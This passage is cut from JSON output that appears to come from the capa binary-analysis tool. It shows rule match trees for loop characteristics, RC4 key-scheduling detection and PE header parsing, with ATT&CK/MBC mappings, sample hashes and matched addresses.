                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465550
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442466123
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442466123
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442466743
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442466743
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442467356
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442467423
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442467504
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442469203
                    },
                    {
                      "type": "absolute",
                      "value": 6442469389
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442467716
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442467753
                    },
                    {
                      "type": "absolute",
                      "value": 6442467838
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442467924
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468298
                    },
                    {
                      "type": "absolute",
                      "value": 6442467981
                    },
                    {
                      "type": "absolute",
                      "value": 6442468110
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442468713
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468740
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442468784
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468832
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442468933
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468993
                    },
                    {
                      "type": "absolute",
                      "value": 6442469075
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442469175
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442469203
                    },
                    {
                      "type": "absolute",
                      "value": 6442469389
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encrypt data using RC4 KSA": {
        "meta": {
          "name": "encrypt data using RC4 KSA",
          "namespace": "data-manipulation/encryption/rc4",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Cryptography",
                "Encrypt Data",
                "RC4"
              ],
              "objective": "Cryptography",
              "behavior": "Encrypt Data",
              "method": "RC4",
              "id": "C0027.009"
            },
            {
              "parts": [
                "Cryptography",
                "Encryption Key",
                "RC4 KSA"
              ],
              "objective": "Cryptography",
              "behavior": "Encryption Key",
              "method": "RC4 KSA",
              "id": "C0028.002"
            }
          ],
          "references": [],
          "examples": [
            "34404A3FB9804977C6AB86CB991FB130:0x403D40",
            "9324D1A8AE37A36AE560C37448C9705A:0x404950",
            "2B8BEC5BCB1777EAA155D832F7AFC797:0x405C42",
            "73CE04892E5F39EC82B00C02FC04C70F:0x40646E"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encrypt data using RC4 KSA\r\n    namespace: data-manipulation/encryption/rc4\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic, mnemonic, Not features\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Cryptography::Encrypt Data::RC4 [C0027.009]\r\n      - Cryptography::Encryption Key::RC4 KSA [C0028.002]\r\n    examples:\r\n      - 34404A3FB9804977C6AB86CB991FB130:0x403D40\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x404950\r\n      - 2B8BEC5BCB1777EAA155D832F7AFC797:0x405C42\r\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x40646E\r\n  features:\r\n    - or:\r\n      - and:\r\n        - basic block:\r\n          - and:\r\n            - description: initialize S\r\n            # misses if regular loop is used,\r\n            # however we cannot model that a loop contains a certain number\r\n            - characteristic: tight loop\r\n            - or:\r\n              - number: 0xFF\r\n              - number: 0x100\r\n        - or:\r\n          - description: modulo 256\r\n          - match: calculate modulo 256 via x86 assembly\r\n          - basic block:\r\n            - and:\r\n              - description: modulo via zero-extended mov from 8-bit register\r\n              - count(mnemonic(movzx)): 2 or more\r\n              # avoid false positives; filter out unexpected instructions\r\n              - not:\r\n                - or:\r\n                  - mnemonic: shl\r\n                  - mnemonic: rol\r\n                  - characteristic: nzxor\r\n        - or:\r\n          - description: modulo key length\r\n          - mnemonic: div\r\n          - mnemonic: idiv\r\n      - and:\r\n        - description: write DWORDs instead of bytes\r\n        - or:\r\n          - number: 0x03020100\r\n          - number: 0xFFFEFDFC\r\n        - instruction:\r\n          - or:\r\n            - mnemonic: add\r\n            - mnemonic: sub\r\n          - number: 0x04040404\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442464629
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and",
                      "description": "write DWORDs instead of bytes"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 50462976
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 4294901244
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "encrypt data using RC4 KSA/6109c492966e403da5ce7830a3332ee9"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "subscope",
                          "scope": "basic block"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "initialize S"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "tight loop"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442464780
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 255
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 256
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442464998
                                    },
                                    {
                                      "type": "absolute",
                                      "value": 6442464791
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "initialize S"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "tight loop"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442464735
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 255
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 256
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442464768
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442464780
                        },
                        {
                          "type": "absolute",
                          "value": 6442464735
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "modulo 256"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "calculate modulo 256 via x86 assembly"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and",
                                  "description": "modulo via zero-extended mov from 8-bit register"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "range",
                                      "min": 2,
                                      "max": 9223372036854775808,
                                      "child": {
                                        "type": "mnemonic",
                                        "mnemonic": "movzx"
                                      }
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442464827
                                    },
                                    {
                                      "type": "absolute",
                                      "value": 6442464860
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "not"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "shl"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "rol"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "characteristic",
                                              "characteristic": "nzxor"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442464780
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or",
                          "description": "modulo key length"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "mnemonic",
                              "mnemonic": "div"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442464850
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "mnemonic",
                              "mnemonic": "idiv"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442464875
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "parse PE header": {
        "meta": {
          "name": "parse PE header",
          "namespace": "load-code/pe",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x403DD0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: parse PE header\r\n    namespace: load-code/pe\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires mnemonic, operand[1].offset features\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x403DD0\r\n  features:\r\n    - and:\r\n      - os: windows\r\n      - and:\r\n        - mnemonic: cmp\r\n        - or:\r\n          - number: 0x4550 = IMAGE_NT_SIGNATURE (PE)\r\n          - and:\r\n            - number: 0x50\r\n            - number: 0x45\r\n        - or:\r\n          - number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ)\r\n          - and:\r\n            - number: 0x4D\r\n            - number: 0x5A\r\n        - optional:\r\n          - and:\r\n            - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n            - or:\r\n              - and:\r\n                - arch: i386\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n              - and:\r\n                - arch: amd64\r\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n                - operand[1].offset: 0x30 = IMAGE_NT_HEADERS64.OptionalHeader.ImageBase\r\n          - basic block:\r\n            - and:\r\n              - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\r\n              - 3 or more:\r\n                - operand[1].offset: 0x4 = IMAGE_NT_HEADERS.FileHeader.Machine\r\n                - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\r\n                - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\r\n                - operand[1].offset: 0x16 = IMAGE_NT_HEADERS.FileHeader.Characteristics\r\n                - operand[1].offset: 0x28 = IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  # for 32 and 64 bit\r\n                - or:\r\n                  - and:\r\n                    - arch: i386\r\n                    - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\r\n                  - and:\r\n                    - arch: amd64\r\n                    - operand[1].offset: 0x30 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\r\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442465298
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "cmp"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442465352
                        },
                        {
                          "type": "absolute",
                          "value": 6442465338
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 17744,
                              "description": "IMAGE_NT_SIGNATURE (PE)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465338
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 80
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 69
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 23117,
                              "description": "IMAGE_DOS_SIGNATURE (MZ)"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442465352
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 77
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 90
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 60,
                                  "description": "IMAGE_DOS_HEADER.e_lfanew"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 6442465323
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 52,
                                          "description": "IMAGE_NT_HEADERS.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 80,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 48,
                                          "description": "IMAGE_NT_HEADERS64.OptionalHeader.ImageBase"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "parse PE header/95af70cf6fb0482ab5ddecde71e3b40a"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465405
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
